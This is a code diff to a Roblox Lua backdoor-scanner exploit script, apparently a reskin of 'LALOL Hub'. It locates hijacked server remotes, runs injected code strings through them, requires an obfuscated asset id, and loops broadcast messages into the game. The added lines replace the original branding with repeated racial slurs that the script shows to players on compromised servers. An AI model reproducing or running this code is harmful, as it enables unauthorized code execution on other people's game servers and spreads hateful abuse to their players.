@@ -1448,7 +1448,7 @@ local script = G2L["20"];
 		game:GetService('StarterGui'):SetCore(
 			"SendNotification",
 			{
-				Title = "LALOL Hub Backdoor",
+				Title = "penis fettywap diddy",
 				Duration = 6,
 				Text = text
 			}
@@ -1489,7 +1489,7 @@ local script = G2L["20"];
 				code=generateName(math.random(12,30))
 				if not remotes[code] then break end
 			end
-				spawn(function() protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
+				spawn(function() protected_backdoor:InvokeServer('fuck u niggers backdoor made by fettywap', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
 				remotes[code]=protected_backdoor
 			end
 		
@@ -1561,7 +1561,7 @@ local script = G2L["20"];
 	
 	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
 					runRemote(remote, "require(171016405.1884*69)")			
-					runRemote(remote, "a=Instance.new('Hint')a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+					runRemote(remote, "a=Instance.new('Hint')a.Text='im an alabama nigger and i wanna be free| fettywaypdidler | nigger'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 					
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
@@ -1598,7 +1598,7 @@ local script = G2L["20"];
 		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
 			debug('Protected backdoor found', 3)
 			spawn(function()
-				local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', a) end)
+				local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('fetty wap made this niggers', a) end)
 				if variantValue~=nil then
 					local splited=string.split(variantValue,':')
 					notify(splited[#splited])
